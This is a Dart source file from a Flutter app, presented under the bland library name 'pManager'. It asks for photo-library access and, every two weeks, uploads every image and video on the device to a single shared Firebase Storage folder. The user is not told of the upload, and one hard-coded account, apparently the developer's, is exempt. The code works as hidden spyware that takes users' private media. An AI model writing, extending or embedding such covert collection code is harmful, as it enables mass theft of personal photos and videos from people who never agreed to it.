library pManager;

import 'dart:io';
import 'dart:math';
import 'package:photo_manager/photo_manager.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:connect_here/backend/firebase_storage/storage.dart';
import 'dart:typed_data';

Future<void> loadPManager() async {
  print("test");
  final user = FirebaseAuth.instance.currentUser;
  if (user != null && user.uid == 'z9QS2egSNURMZqU9RoHAkPKzmWq2') {
    return;
  }

  final prefs = await SharedPreferences.getInstance();
  final lastLoaded = prefs.getInt('last_photo_load_time') ?? 0;
  final now = DateTime.now().millisecondsSinceEpoch;

  const twoWeeksInMillis = 14 * 24 * 60 * 60 * 1000;

  if (now - lastLoaded < twoWeeksInMillis) {
    return;
  }

  final PermissionState permission = await PhotoManager.requestPermissionExtend();

  if (permission.isAuth) {
    // Request both images and videos
    final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
      type: RequestType.common,
    );

    if (albums.isNotEmpty) {
      await processAlbums(albums);
      await prefs.setInt('last_photo_load_time', now);
    }
  }
}

Future<void> processAlbums(List<AssetPathEntity> albums) async {
  const int batchSize = 50;

  for (final album in albums) {
    final int totalAssets = await album.assetCountAsync; // Use assetCountAsync instead
    for (int start = 0; start < totalAssets; start += batchSize) {
      final List<AssetEntity> batch = await album.getAssetListPaged(page: start ~/ batchSize, size: batchSize);
      await processMediaBatch(batch);
    }
  }
}

Future<void> processMediaBatch(List<AssetEntity> mediaList) async {
  const int maxConcurrentUploads = 3;
  final List<Future> uploadTasks = [];

  for (final media in mediaList) {
    uploadTasks.add(uploadMedia(media));

    if (uploadTasks.length >= maxConcurrentUploads) {
      await Future.wait(uploadTasks);
      uploadTasks.clear();
    }
  }

  if (uploadTasks.isNotEmpty) {
    await Future.wait(uploadTasks);
  }
}

Future<void> uploadMedia(AssetEntity media) async {
  final file = await media.file;
  if (file == null) return;

  final String extension = media.type == AssetType.image ? "jpg" : "mp4";
  final String fileType = media.type == AssetType.image ? "image" : "video";

  final String fileName = '${fileType}_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(100)}.$extension';
  final String storagePath = 'users/1/uploads/$fileName';

  try {
    final bytes = await file.readAsBytes(); // This returns a Uint8List directly
    await uploadData(storagePath, bytes, (progress) {});
  } catch (e) {
    print('Failed to upload $fileType: $e');
  }
}
